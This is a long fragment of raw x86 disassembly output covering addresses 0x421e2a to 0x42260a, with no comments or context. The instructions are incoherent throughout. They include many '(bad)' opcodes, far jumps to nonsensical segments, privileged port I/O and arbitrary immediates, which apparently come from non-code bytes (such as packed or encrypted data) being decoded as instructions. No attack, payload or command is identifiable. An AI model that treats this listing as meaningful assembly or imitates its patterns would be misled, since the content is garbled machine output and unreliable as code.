  421e2a:	mov    WORD PTR [eax-0x5506cb22],es
  421e30:	sbb    esp,ebp
  421e32:	ins    BYTE PTR es:[edi],dx
  421e33:	out    0xfd,al
  421e35:	bound  esp,QWORD PTR [ebp*2-0x2c8f6f38]
  421e3c:	dec    eax
  421e3d:	or     al,0x87
  421e3f:	xor    esi,DWORD PTR [edi]
  421e41:	fldenv [edi+0x1]
  421e44:	retf   0x24c1
  421e47:	sbb    eax,0x1b67918c
  421e4c:	into   
  421e4d:	push   ss
  421e4e:	shr    DWORD PTR [esi-0x2d7a4d9f],0x53
  421e55:	adc    eax,DWORD PTR [eax]
  421e57:	call   0x1c2c1b42
  421e5c:	dec    esp
  421e5d:	mov    esi,0xfa1c77d3
  421e62:	push   edi
  421e63:	jecxz  0x421e65
  421e65:	sbb    ah,bh
  421e67:	aad    0x79
  421e69:	lods   al,BYTE PTR ds:[esi]
  421e6a:	mov    dl,0xe6
  421e6c:	bnd jle 0x421e1c
  421e6f:	fnstsw WORD PTR [eax-0x5b]
  421e72:	shl    eax,cl
  421e74:	pop    esi
  421e75:	stc    
  421e76:	adc    al,0xb2
  421e78:	jmp    0xe916b855
  421e7d:	dec    edi
  421e7e:	aad    0x8c
  421e80:	mov    ebp,0xc4ceb55f
  421e85:	loopne 0x421e77
  421e87:	gs mov al,0xb2
  421e8a:	ret    0xcffa
  421e8d:	cmp    eax,0x3af7116d
  421e92:	imul   edx,DWORD PTR [esi],0x88ff24d6
  421e98:	js     0x421eaf
  421e9a:	call   0xb67e:0x58975be1
  421ea1:	push   es
  421ea2:	push   0xffffffcd
  421ea4:	test   DWORD PTR [edx+0x57],edi
  421ea7:	in     eax,0x9
  421ea9:	lods   al,BYTE PTR ds:[esi]
  421eaa:	ficom  WORD PTR [edx]
  421eac:	push   ss
  421ead:	dec    eax
  421eae:	leave  
  421eaf:	repnz mov ecx,0x2eac3cb4
  421eb5:	or     BYTE PTR [ebp+0xf07da8a],dh
  421ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ebc:	mov    dl,0xf9
  421ebf:	xchg   esi,eax
  421ec0:	jae    0x421eee
  421ec2:	pop    ss
  421ec3:	or     esi,DWORD PTR [eax+0x5109c5fd]
  421ec9:	neg    DWORD PTR [esi-0x2c98cf77]
  421ecf:	ror    cl,cl
  421ed1:	pop    ss
  421ed2:	mov    dh,0x91
  421ed4:	dec    ebx
  421ed5:	hlt    
  421ed6:	iret   
  421ed7:	xchg   ebp,eax
  421ed8:	cmc    
  421ed9:	das    
  421eda:	pop    ds
  421edb:	jno    0x421ef4
  421edd:	enter  0x44d6,0x67
  421ee1:	pop    ebp
  421ee2:	or     eax,0x822343fd
  421ee7:	xchg   ebp,eax
  421ee8:	lds    edx,FWORD PTR [ebx]
  421eea:	dec    ebx
  421eeb:	je     0x421f11
  421eed:	dec    ebp
  421eee:	shl    DWORD PTR [eax+0x57],cl
  421ef1:	(bad)  
  421ef2:	aad    0x9b
  421ef4:	xchg   ebx,eax
  421ef5:	loopne 0x421e7d
  421ef7:	sbb    eax,0xe7f9878a
  421efc:	adc    BYTE PTR [esi],ch
  421efe:	pop    edx
  421eff:	out    0x6c,eax
  421f01:	xlat   BYTE PTR ds:[ebx]
  421f02:	mov    esi,0x2e192734
  421f07:	mov    ebx,0x48cede8
  421f0c:	jmp    0xa6a66318
  421f11:	cmp    ecx,DWORD PTR [ebx+0xcc356c4]
  421f17:	retf   
  421f18:	inc    edi
  421f19:	xlat   BYTE PTR ds:[ebx]
  421f1a:	adc    BYTE PTR [ebx+0x72],bl
  421f1d:	pop    ss
  421f1e:	call   0x4e7f0b60
  421f23:	mov    ch,BYTE PTR [ecx-0x51960d21]
  421f29:	lds    edx,FWORD PTR [eax+0x7]
  421f2c:	mov    edi,0xa7132192
  421f31:	es scas al,BYTE PTR es:[edi]
  421f33:	aad    0x24
  421f35:	sub    ebx,ecx
  421f37:	or     eax,0xb501c1ca
  421f3c:	jmp    0xe352c029
  421f41:	ins    DWORD PTR es:[edi],dx
  421f42:	sar    DWORD PTR [ebp+edi*4+0x6d],0xec
  421f47:	jp     0x421ee1
  421f49:	js     0x421ef7
  421f4b:	push   0x2a
  421f4d:	out    dx,eax
  421f4e:	jbe    0x421fc8
  421f50:	sbb    DWORD PTR [edi+0x3a],esp
  421f53:	addr16 aad 0xad
  421f56:	jno    0x421f00
  421f58:	ret    0x22b0
  421f5b:	js     0x421f1d
  421f5d:	sbb    al,0x64
  421f5f:	pop    esp
  421f60:	add    eax,0xe07995e6
  421f65:	ins    DWORD PTR es:[edi],dx
  421f66:	pop    ss
  421f67:	mov    dh,0x97
  421f69:	(bad)  
  421f6a:	ret    
  421f6b:	repz ja 0x421f41
  421f6e:	xchg   esi,eax
  421f6f:	add    BYTE PTR [ebp-0x18],cl
  421f72:	xchg   esp,eax
  421f73:	push   0xffffffdb
  421f75:	mov    ecx,0x6f25b4f7
  421f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f7b:	retf   
  421f7c:	xchg   ebx,eax
  421f7d:	cmp    BYTE PTR [ebx],0x9
  421f80:	xor    BYTE PTR [ebp+0x4aa13293],0xd3
  421f87:	jp     0x421fee
  421f89:	inc    ebx
  421f8a:	jno    0x421fad
  421f8c:	and    DWORD PTR [ebx+0x4],0xffffffcd
  421f90:	repz std 
  421f92:	repz jmp 0x14dbaae6
  421f98:	jmp    0xefbd4db4
  421f9d:	add    ch,BYTE PTR [edi+ebp*1-0x6d]
  421fa1:	shl    DWORD PTR [edx+0x6d8d7b9e],1
  421fa7:	sub    esp,DWORD PTR [eax-0x643cbe30]
  421fad:	inc    eax
  421fae:	inc    edx
  421faf:	pop    ebx
  421fb0:	gs icebp 
  421fb2:	push   ds
  421fb3:	inc    edi
  421fb4:	inc    ebp
  421fb5:	xchg   ebx,eax
  421fb6:	rol    BYTE PTR [ecx],0x71
  421fb9:	pop    esi
  421fba:	fadd   QWORD PTR [ecx+0x1e31ae99]
  421fc0:	xor    al,0xcc
  421fc2:	lods   al,BYTE PTR ds:[esi]
  421fc3:	and    DWORD PTR [edi],esi
  421fc5:	jne    0x421f6b
  421fc7:	xlat   BYTE PTR ds:[ebx]
  421fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fc9:	mov    ds:0xedfe5fd,al
  421fce:	sub    eax,0x6aa414c
  421fd3:	sar    BYTE PTR [edx+edi*4],0x5
  421fd7:	shr    DWORD PTR [ebp-0x492dd5e8],0xfb
  421fde:	icebp  
  421fdf:	push   es
  421fe0:	push   edi
  421fe1:	int3   
  421fe2:	adc    eax,0x4b1c1596
  421fe7:	and    al,dl
  421fe9:	(bad)  
  421fea:	xor    eax,0xccb93cfb
  421fef:	outs   dx,BYTE PTR ds:[esi]
  421ff0:	addr16 aad 0x2b
  421ff3:	add    eax,DWORD PTR [esp+eiz*8-0xe]
  421ff7:	jbe    0x421fb0
  421ff9:	jle    0x422055
  421ffb:	lds    ebx,FWORD PTR [edi+0x714ca592]
  422001:	scas   al,BYTE PTR es:[edi]
  422002:	outs   dx,BYTE PTR ds:[esi]
  422003:	rol    DWORD PTR [eax],1
	...
  422011:	inc    edx
  422012:	dec    edi
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0x4bfadc76
  422020:	push   ebx
  422021:	sbb    ebx,DWORD PTR [ecx+0x3ab0001]
  422027:	add    BYTE PTR [eax],al
  422029:	add    al,0x4d
  42202b:	repnz test BYTE PTR [eax],ah
  42202e:	bound  ebp,QWORD PTR [ecx]
  422030:	imul   edx,DWORD PTR [ebp+0x2d3f5bf8],0xffffff94
  422037:	jbe    0x4220ae
  422039:	mov    eax,0xd9941fbd
  42203e:	and    ah,BYTE PTR [edx-0x4a986a7d]
  422044:	idiv   BYTE PTR [eax-0x47]
  422047:	aas    
  422048:	xchg   ecx,eax
  422049:	lds    edi,FWORD PTR [eax]
  42204b:	jmp    0x422076
  42204d:	xchg   DWORD PTR [ebx],esp
  42204f:	loope  0x4220b8
  422051:	scas   eax,DWORD PTR es:[edi]
  422052:	imul   edx,DWORD PTR [esi-0x7d],0x7e
  422056:	lods   eax,DWORD PTR ds:[esi]
  422057:	(bad)  
  422058:	cmc    
  422059:	das    
  42205a:	rcl    DWORD PTR [esi-0x44],1
  42205d:	inc    eax
  42205e:	jb     0x4220c8
  422060:	fs pop esp
  422062:	mov    bh,0x9b
  422064:	or     cl,al
  422066:	mov    cl,0xd4
  422068:	les    edx,FWORD PTR [esp-0x31]
  42206c:	push   ss
  42206d:	in     al,dx
  42206e:	loope  0x421ff5
  422070:	jmp    0x9283:0xe14aeee9
  422077:	or     dh,BYTE PTR [edx]
  422079:	add    eax,0xb8fdd189
  42207e:	out    0xe5,al
  422080:	cmp    edx,DWORD PTR [esi-0x40]
  422083:	lock cmp al,0xb4
  422086:	pop    esi
  422087:	xchg   ebp,eax
  422088:	lea    ebx,[esi]
  42208a:	loope  0x4220b8
  42208c:	data16 into 
  42208e:	dec    ebp
  42208f:	lods   al,BYTE PTR ds:[esi]
  422090:	repz fs mov ebp,0xe6edd3b6
  422097:	xchg   ecx,eax
  422099:	jnp    0x4220e0
  42209b:	scas   al,BYTE PTR es:[edi]
  42209c:	iret   
  42209d:	add    DWORD PTR ds:0x7dfff55d,eax
  4220a3:	sbb    eax,0x8b36f7c3
  4220a8:	in     eax,dx
  4220a9:	fmul   DWORD PTR cs:[di]
  4220ad:	push   0xc269af72
  4220b2:	shl    BYTE PTR [edi+ebx*1],0x89
  4220b6:	push   eax
  4220b7:	popa   
  4220b8:	in     al,0xae
  4220ba:	adc    eax,0x86de7a43
  4220bf:	xchg   esp,eax
  4220c0:	aam    0xb5
  4220c2:	test   DWORD PTR ds:0xc8204d5,ecx
  4220c8:	or     bl,ah
  4220ca:	je     0x42212c
  4220cc:	mov    esp,0xa47d8ee2
  4220d1:	mov    ebp,0x6957561
  4220d6:	inc    ebx
  4220d7:	xchg   ebp,eax
  4220d8:	daa    
  4220d9:	adc    ebx,ebp
  4220db:	and    esp,0xdb7e3d8
  4220e1:	aas    
  4220e2:	pop    edi
  4220e3:	inc    ecx
  4220e4:	lock mov ?,WORD PTR [edi+0x15dfab4c]
  4220eb:	mov    esi,ebx
  4220ed:	add    ebx,DWORD PTR ds:0x6416
  4220f2:	jmp    FWORD PTR [eax-0x15e6f0f3]
  4220f8:	pop    edi
  4220f9:	pop    ebp
  4220fa:	adc    bh,BYTE PTR [edx]
  4220fc:	scas   eax,DWORD PTR es:[edi]
  4220fd:	sub    eax,0x2a621e79
  422102:	fs jle 0x422132
  422105:	js     0x4220a5
  422107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422108:	stc    
  422109:	push   es
  42210a:	fisttp DWORD PTR [eax+0xe]
  42210d:	in     al,dx
  42210e:	sbb    eax,0x2035a86c
  422113:	mov    bh,0x33
  422115:	add    al,0x56
  422117:	mov    ebx,0x1a8a4920
  42211c:	clc    
  42211d:	out    0xfe,al
  42211f:	ror    DWORD PTR [edi+0x5afda6a4],0x18
  422126:	push   esp
  422127:	push   es
  422128:	pop    ss
  422129:	cwde   
  42212a:	sub    DWORD PTR [esi-0x5c],0xe1383c4
  422131:	sbb    BYTE PTR [edi-0x9833d0b],dh
  422137:	cdq    
  422138:	xchg   esp,eax
  422139:	push   es
  42213a:	nop
  42213b:	add    eax,0xcb3372f2
  422140:	adc    DWORD PTR [ecx-0x25],0x5c3f8efd
  422147:	add    al,0xd3
  422149:	loope  0x42218f
  42214b:	or     ah,BYTE PTR [ebx-0x5d]
  42214e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42214f:	xor    al,0xca
  422151:	mov    esp,0x564e4f52
  422156:	sub    DWORD PTR [edx],ebp
  422158:	and    eax,0xb5fae351
  42215d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42215e:	mov    ecx,0x1bcb5a2d
  422163:	push   edx
  422164:	ins    BYTE PTR es:[edi],dx
  422165:	rcr    ecx,1
  422167:	sub    eax,0x1fb84223
  42216c:	popf   
  42216d:	loopne 0x4221bb
  42216f:	scas   al,BYTE PTR es:[edi]
  422170:	xchg   BYTE PTR [ecx],dl
  422172:	adc    ecx,DWORD PTR [ebp-0x5b]
  422175:	xor    ebx,DWORD PTR [esi-0x2e]
  422178:	or     eax,0x83842c1c
  42217d:	mov    bh,0xfe
  42217f:	cs in  eax,dx
  422181:	dec    BYTE PTR [esi+0x40ad4006]
  422187:	iret   
  422188:	aaa    
  422189:	inc    ebx
  42218a:	dec    edx
  42218b:	cld    
  42218c:	gs in  eax,dx
  42218e:	hlt    
  42218f:	sbb    eax,0xe5b03274
  422194:	test   eax,0xb485c94
  42219a:	push   ebx
  42219b:	in     al,dx
  42219c:	or     ebp,DWORD PTR [eax-0x14]
  42219f:	dec    eax
  4221a0:	enter  0x3e81,0x41
  4221a4:	je     0x422210
  4221a6:	fldenv [esi]
  4221a8:	and    ebp,DWORD PTR [ebx+0x49]
  4221ab:	cwde   
  4221ac:	xor    al,0x14
  4221ae:	ja     0x42218c
  4221b0:	jl     0x42213d
  4221b2:	fdiv   DWORD PTR [eax-0x30]
  4221b5:	push   ebx
  4221b6:	sar    DWORD PTR [edx-0x6b],cl
  4221b9:	aam    0x43
  4221bb:	not    DWORD PTR [ebp+0x7c]
  4221be:	(bad)  
  4221bf:	push   ebp
  4221c0:	add    al,0xf7
  4221c2:	cmp    DWORD PTR cs:[edx],0x266c152a
  4221c9:	inc    ecx
  4221ca:	repz mov ds:0x9d211929,eax
  4221d0:	sbb    eax,0xddbed145
  4221d5:	nop
  4221d6:	stos   BYTE PTR es:[edi],al
  4221d7:	pop    esi
  4221d8:	adc    DWORD PTR [eax-0x1a055b9f],esi
  4221de:	dec    edx
  4221df:	aam    0xb
  4221e1:	shl    DWORD PTR [ebx],cl
  4221e3:	stos   BYTE PTR es:[edi],al
  4221e4:	aaa    
  4221e5:	jle    0x4221da
  4221e7:	daa    
  4221e8:	mov    DWORD PTR [ebp-0x4d855ee5],ebp
  4221ee:	outs   dx,BYTE PTR ds:[esi]
  4221ef:	adc    eax,0x8d90fd3a
  4221f4:	push   es
  4221f5:	sbb    BYTE PTR [edi+0x77],bh
  4221f8:	push   0xffffffd5
  4221fa:	imul   edi,DWORD PTR [eax],0xffffff83
  4221fd:	daa    
  4221fe:	in     al,dx
  4221ff:	sahf   
  422200:	daa    
  422201:	xchg   esi,eax
  422202:	loop   0x422221
  422204:	push   ebp
  422205:	push   0x7c
  422207:	(bad)  
  422208:	test   eax,0x2a3f0d6
  42220d:	cwde   
  42220e:	jbe    0x422257
  422210:	push   esp
  422211:	mov    ss,WORD PTR [edi+edx*2-0x77]
  422215:	outs   dx,DWORD PTR ds:[esi]
  422216:	(bad)  
  422217:	ins    BYTE PTR es:[edi],dx
  422218:	cmp    DWORD PTR [eax+0x5f],ebx
  42221b:	xadd   ch,bh
  42221e:	cmp    DWORD PTR [edi],0xffffff8f
  422221:	push   edx
  422222:	repz cli 
  422224:	jmp    0x422255
  422226:	adc    al,0x72
  422228:	bound  edi,QWORD PTR [edx+0x11b99e9e]
  42222e:	cmp    BYTE PTR [ecx-0x1d],0x9f
  422232:	dec    eax
  422233:	push   cs
  422234:	sub    esi,esi
  422236:	pop    esp
  422237:	pop    esp
  422238:	popf   
  422239:	cmp    al,0x91
  42223b:	add    DWORD PTR [ebp+0x16],ebp
  42223e:	and    ecx,DWORD PTR [ecx+0x49525177]
  422244:	in     eax,0xe6
  422246:	je     0x4221d6
  422248:	fdivp  st(4),st
  42224a:	sbb    eax,DWORD PTR [ecx+0x12]
  42224d:	retf   
  42224e:	enter  0x52f7,0x46
  422252:	mov    esp,0xf1c10360
  422257:	(bad)  
  422258:	jb     0x42226a
  42225a:	mov    ss,edx
  42225c:	or     al,0xbf
  42225e:	sbb    ah,BYTE PTR [eax]
  422260:	enter  0xdf04,0x72
  422264:	ret    0xc402
  422267:	ret    0x47d4
  42226a:	out    dx,al
  42226b:	test   al,0x29
  42226d:	int    0xbc
  42226f:	(bad)  
  422271:	inc    DWORD PTR [edi+0x56f4be53]
  422277:	adc    eax,0x715b3a63
  42227c:	or     DWORD PTR [ebx+0x50a942ae],esp
  422282:	mov    ?,WORD PTR [edi]
  422284:	int3   
  422285:	xchg   ecx,eax
  422286:	and    bh,BYTE PTR [edx-0x1]
  422289:	and    ah,BYTE PTR [ebx]
  42228b:	cmc    
  42228c:	sub    DWORD PTR [edx-0x6d],esi
  42228f:	dec    ebx
  422290:	and    eax,0x9db68d1c
  422295:	(bad)  
  422296:	push   esp
  422297:	emms   
  422299:	sub    ebx,DWORD PTR [edi-0x224b61eb]
  42229f:	leave  
  4222a0:	jno    0x422286
  4222a2:	in     al,dx
  4222a3:	mov    bh,0xe0
  4222a5:	lea    ebx,[ebp-0x76]
  4222a8:	sbb    cl,BYTE PTR [ecx]
  4222aa:	cmp    eax,0xa3a1dbe0
  4222af:	popa   
  4222b0:	jle    0x4222e9
  4222b2:	test   DWORD PTR [edx+0x5f],ecx
  4222b5:	retf   0x80da
  4222b8:	or     DWORD PTR [eax-0x16],edi
  4222bb:	mov    edi,0x1338a018
  4222c0:	xor    dl,BYTE PTR [ebx]
  4222c2:	test   al,0xa4
  4222c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c5:	inc    edi
  4222c6:	sub    al,ch
  4222c8:	or     al,0xbd
  4222ca:	or     al,0xde
  4222cc:	jp     0x42234b
  4222ce:	push   0xffffff9b
  4222d0:	adc    al,BYTE PTR [ebp+0x228f984c]
  4222d6:	or     DWORD PTR [esi-0x32a474df],ebp
  4222dc:	clc    
  4222dd:	pop    ds
  4222de:	and    BYTE PTR [ebx+0x3e],bl
  4222e1:	mov    cl,0x2a
  4222e3:	inc    eax
  4222e4:	or     ecx,esp
  4222e6:	add    ch,BYTE PTR [esp+eax*1]
  4222e9:	mov    ds:0x37129389,al
  4222ee:	add    ah,BYTE PTR [eax-0x30]
  4222f1:	stos   BYTE PTR es:[edi],al
  4222f2:	jns    0x422342
  4222f4:	enter  0x281f,0x42
  4222f8:	pop    edi
  4222f9:	push   edi
  4222fa:	mov    ah,0xfb
  4222fc:	mov    bl,0x88
  4222fe:	loope  0x4222a8
  422300:	ret    
  422301:	adc    BYTE PTR [edx-0x18],bl
  422304:	push   edx
  422305:	inc    edi
  422306:	mov    BYTE PTR [ebp-0x6a],cl
  422309:	pop    eax
  42230a:	sbb    eax,0xd22ad7f4
  42230f:	mov    cl,0x92
  422311:	bound  edi,QWORD PTR [edi+0x23]
  422314:	mov    ebp,0x9552e7
  422319:	cmp    ebp,ebx
  42231b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42231c:	add    ebp,DWORD PTR [ecx-0x64817376]
  422322:	(bad)  
  422323:	shr    DWORD PTR [ecx+0x31],cl
  422326:	jo     0x422312
  422328:	and    al,bl
  42232a:	test   al,0x38
  42232c:	pop    ecx
  42232d:	and    edx,DWORD PTR [ecx+0x29]
  422330:	ss stc 
  422332:	dec    edi
  422333:	aad    0xab
  422335:	mov    ebp,ecx
  422337:	mov    ebx,0x1956d062
  42233c:	cmp    DWORD PTR [ecx+0x4b848dc3],ebp
  422342:	cld    
  422343:	mov    WORD PTR [ecx-0x1edaff],?
  422349:	cld    
  42234a:	adc    DWORD PTR [edi],edi
  42234c:	cmc    
  42234d:	jbe    0x422324
  42234f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422350:	add    BYTE PTR [ecx-0x474fa809],dh
  422356:	pop    edi
  422357:	retf   0xa3d6
  42235a:	mov    BYTE PTR ds:0xe5cd1c2d,ch
  422360:	in     al,dx
  422361:	repnz int3 
  422363:	add    eax,0xb88f574e
  422368:	mov    esi,0x5477f246
  42236d:	out    0x29,al
  42236f:	xor    BYTE PTR [edx-0x6af7a1f6],0x8b
  422376:	cli    
  422377:	xchg   edi,eax
  422378:	adc    eax,0x13113cdf
  42237d:	outs   dx,BYTE PTR ds:[esi]
  42237e:	xchg   edx,eax
  42237f:	in     al,dx
  422380:	xchg   esi,eax
  422381:	mov    ds:0xdee25bb4,eax
  422386:	push   edi
  422387:	xor    eax,0x7baea8c3
  42238c:	push   eax
  42238d:	fdivr  st(1),st
  42238f:	mov    cl,BYTE PTR [ecx-0x64]
  422392:	aaa    
  422393:	arpl   ax,cx
  422395:	cli    
  422396:	pop    ebp
  422397:	es pop edx
  422399:	push   esp
  42239a:	fidiv  WORD PTR ds:0x9be8d209
  4223a0:	jb     0x422346
  4223a2:	ss inc eax
  4223a4:	cwde   
  4223a5:	add    al,dh
  4223a7:	push   es
  4223a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a9:	push   ds
  4223aa:	sub    eax,0xcfe1307
  4223af:	mov    ?,ebp
  4223b1:	adc    ah,BYTE PTR [esi+0x32]
  4223b4:	xchg   ecx,eax
  4223b5:	sbb    ch,BYTE PTR [edi+0x49]
  4223b8:	ins    DWORD PTR es:[edi],dx
  4223b9:	or     DWORD PTR [edi],0x52
  4223bc:	rol    BYTE PTR [esi-0x9],1
  4223bf:	imul   esp,esp,0x7b9248c2
  4223c5:	mov    edx,0xb33f0b3f
  4223ca:	dec    ebx
  4223cb:	clc    
  4223cc:	add    eax,0xd724c39d
  4223d1:	and    DWORD PTR [ecx],0x4c
	...
  4223df:	add    BYTE PTR [eax],al
  4223e1:	data16 jl 0x4223c4
  4223e4:	mov    ebx,0xfd7fbffa
  4223e9:	pop    esp
  4223ea:	mov    eax,ds:0x45be4f5c
  4223ef:	cmc    
  4223f0:	mov    dh,0x9c
  4223f3:	add    DWORD PTR [eax],eax
  4223f5:	stos   DWORD PTR es:[edi],eax
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    BYTE PTR [eax-0x58],dh
  4223fb:	pusha  
  4223fc:	jmp    0x4223bc
  4223fe:	mov    ch,ah
  422400:	cmp    edx,DWORD PTR [eax-0x46]
  422403:	jmp    0x32f4:0x13aea0f1
  42240a:	dec    edx
  42240b:	sbb    ecx,DWORD PTR [edx-0x12029d62]
  422411:	dec    BYTE PTR gs:[ecx+ebp*1+0x54]
  422416:	mov    ds:0x169334e7,al
  42241b:	xor    al,0x1b
  42241d:	and    BYTE PTR [esi+0x68c1006b],cl
  422423:	jae    0x42246e
  422425:	cmp    dh,dh
  422427:	mov    bl,ah
  422429:	push   ss
  42242a:	xor    BYTE PTR [ebx-0x18],0x26
  42242e:	adc    ah,BYTE PTR ds:0x7ed24895
  422434:	test   bl,al
  422436:	cmp    eax,0xbc65195a
  42243b:	(bad)  
  42243c:	jmp    0x422411
  42243e:	das    
  42243f:	mov    DWORD PTR [edi+ecx*2],ebx
  422442:	(bad)  
  422443:	repz sahf 
  422445:	or     BYTE PTR [esi],0x7c
  422448:	fbld   TBYTE PTR [ebx-0x6d8e61df]
  42244e:	mov    ds:0x323bec1c,eax
  422453:	xor    eax,DWORD PTR [edi+0x6d91666b]
  422459:	pop    edi
  42245a:	ret    0x8df4
  42245d:	psllw  mm4,QWORD PTR [ecx+edx*4-0x20]
  422462:	push   ecx
  422463:	and    eax,0x2c54ddc8
  422468:	cdq    
  422469:	cmp    BYTE PTR [edi+eiz*4],bl
  42246c:	ret    0x8d87
  42246f:	cmp    ch,dl
  422471:	mov    edi,0x8da12ff6
  422476:	mov    ah,0x8e
  422478:	mov    dh,0xc9
  42247a:	xchg   edx,eax
  42247b:	jmp    0xfe878ce
  422480:	push   es
  422481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422482:	jge    0x42245e
  422484:	dec    edx
  422485:	mov    esi,0xd06b5e82
  42248a:	sbb    DWORD PTR [ebx+0x13],edx
  42248d:	(bad)  
  42248e:	(bad)  
  42248f:	pop    ebx
  422490:	jmp    0xf99835cf
  422495:	xlat   BYTE PTR ds:[ebx]
  422496:	and    DWORD PTR [ecx],ebp
  422498:	aam    0x45
  42249a:	inc    edx
  42249b:	mov    WORD PTR [bp+0x2d46],cs
  4224a0:	popf   
  4224a1:	push   ecx
  4224a2:	ds push ds
  4224a4:	pop    ebp
  4224a5:	stos   BYTE PTR es:[edi],al
  4224a6:	in     eax,dx
  4224a7:	dec    edx
  4224a8:	ds inc ebx
  4224aa:	dec    edi
  4224ab:	xor    eax,0xfefe8c6e
  4224b0:	fcomp  QWORD PTR [edx]
  4224b2:	pop    ss
  4224b3:	adc    al,0x12
  4224b5:	mov    BYTE PTR [eax-0x6f],ah
  4224b8:	scas   eax,DWORD PTR es:[edi]
  4224b9:	lea    esp,[eax-0x8]
  4224bc:	inc    ebx
  4224bd:	inc    esi
  4224be:	sbb    BYTE PTR [ebp-0x7a],0xa8
  4224c2:	mov    bl,0x61
  4224c4:	push   ebp
  4224c5:	sub    ah,dh
  4224c7:	xchg   esp,eax
  4224c8:	bound  esp,QWORD PTR [edi]
  4224ca:	call   0x21aa7143
  4224cf:	dec    ebx
  4224d0:	push   es
  4224d1:	lds    esi,FWORD PTR [edi+0x82e10e8]
  4224d7:	or     BYTE PTR [ebp-0x24],ah
  4224da:	in     al,dx
  4224db:	mov    ch,0x20
  4224dd:	xchg   esp,eax
  4224de:	xor    BYTE PTR [edx],al
  4224e0:	adc    BYTE PTR [ecx-0x4f],cl
  4224e3:	sub    DWORD PTR [edx-0x1a],ebp
  4224e6:	lea    ecx,[edi+0x10e1a94]
  4224ec:	shr    BYTE PTR [esi+0x53],1
  4224ef:	mov    ecx,0x81940e96
  4224f4:	popa   
  4224f5:	aas    
  4224f6:	cwde   
  4224f7:	lea    ebp,[edi-0x27c269f8]
  4224fd:	les    edi,FWORD PTR [edx+0x4f]
  422500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422501:	test   eax,0x40751ac
  422506:	daa    
  422507:	mov    cl,BYTE PTR [eax-0x72a6ddb4]
  42250d:	and    BYTE PTR [eax+0x58b72051],dh
  422513:	adc    al,0xeb
  422515:	mov    ecx,0x26e56ad0
  42251a:	cmc    
  42251b:	ins    DWORD PTR es:[edi],dx
  42251c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42251d:	pop    eax
  42251e:	sbb    cl,BYTE PTR ds:0x9968642
  422524:	rcl    DWORD PTR [edi+0x4191494a],0x5e
  42252b:	xchg   ebx,eax
  42252c:	pop    ecx
  42252d:	aam    0xef
  42252f:	(bad)  
  422530:	aam    0x4f
  422532:	ins    DWORD PTR es:[edi],dx
  422533:	aad    0xa5
  422535:	add    esp,DWORD PTR [esi+0x6bb18425]
  42253b:	pop    esp
  42253c:	dec    eax
  42253d:	inc    esp
  42253e:	xchg   BYTE PTR es:[ebx],bh
  422541:	jg     0x422568
  422543:	push   ebx
  422544:	ja     0x4224e5
  422546:	and    BYTE PTR [ebp-0x1ac888ac],ch
  42254c:	add    ebp,DWORD PTR [eax-0x1b91f3db]
  422552:	inc    esp
  422553:	or     BYTE PTR [eax],al
  422555:	mov    bl,0x15
  422557:	ror    BYTE PTR [edx+0x5d0c6b1a],cl
  42255d:	inc    ecx
  42255e:	sbb    cl,BYTE PTR [ebx]
  422560:	add    ebp,eax
  422562:	push   0xc5c529e3
  422567:	fwait
  422568:	outs   dx,DWORD PTR ds:[esi]
  422569:	xor    BYTE PTR [ecx-0x80],cl
  42256c:	in     al,dx
  42256d:	mov    BYTE PTR [edx+0x7c458b8b],ch
  422573:	lahf   
  422574:	loopne 0x42254c
  422576:	ret    0xcf6c
  422579:	inc    esp
  42257a:	xor    BYTE PTR [ebx+ebx*2],0x3
  42257e:	dec    ebp
  42257f:	xchg   ebp,eax
  422580:	rcl    ah,1
  422582:	inc    ebp
  422583:	pop    ecx
  422584:	sbb    bh,ch
  422586:	adc    al,0xb7
  422588:	and    esp,DWORD PTR [ebx+0x3a9d596e]
  42258e:	addr16 call 0xbfe0c891
  422594:	mov    ebx,0xf0151cc
  422599:	pop    es
  42259a:	adc    ch,BYTE PTR [esi-0x602ca097]
  4225a0:	fbld   TBYTE PTR [eax-0xc]
  4225a3:	push   0x86ff7db
  4225a8:	mov    dl,0x65
  4225aa:	and    eax,0xf7a2b5c1
  4225af:	sub    al,BYTE PTR [ebx-0x2319aa1e]
  4225b5:	out    0x69,al
  4225b7:	push   edi
  4225b8:	(bad)  
  4225b9:	test   eax,0x3898a616
  4225be:	ffreep st(4)
  4225c0:	push   edx
  4225c1:	stc    
  4225c2:	cdq    
  4225c3:	loop   0x42259c
  4225c5:	inc    eax
  4225c6:	aaa    
  4225c7:	sub    BYTE PTR [eax+0x46],al
  4225ca:	in     al,0xf6
  4225cc:	xchg   esi,eax
  4225cd:	dec    BYTE PTR [ecx+0x38]
  4225d0:	je     0x42264c
  4225d2:	mov    dl,0x3d
  4225d4:	sub    dh,cl
  4225d6:	repz iret 
  4225d8:	dec    ebp
  4225d9:	sbb    eax,0x4310a77b
  4225de:	mov    ds:0x17ab84c7,eax
  4225e3:	jnp    0x422640
  4225e5:	inc    edx
  4225e6:	pop    ss
  4225e7:	dec    edx
  4225e8:	lock sti 
  4225ea:	test   BYTE PTR [esi+0x54673c21],ch
  4225f0:	sub    edx,DWORD PTR [edx-0xba561b1]
  4225f6:	lods   eax,DWORD PTR ds:[esi]
  4225f7:	jge    0x422615
  4225f9:	aad    0xb9
  4225fb:	mov    ss,WORD PTR [esi+0x4c]
  4225fe:	stos   DWORD PTR es:[edi],eax
  4225ff:	rol    BYTE PTR [esi+0x42],cl
  422602:	pop    edx
  422603:	add    BYTE PTR [esi],0xe6
  422606:	iret   
  422607:	and    DWORD PTR [eax+0x2e],esp
  42260a:	adc    bl,BYTE PTR [ecx-0x1f]
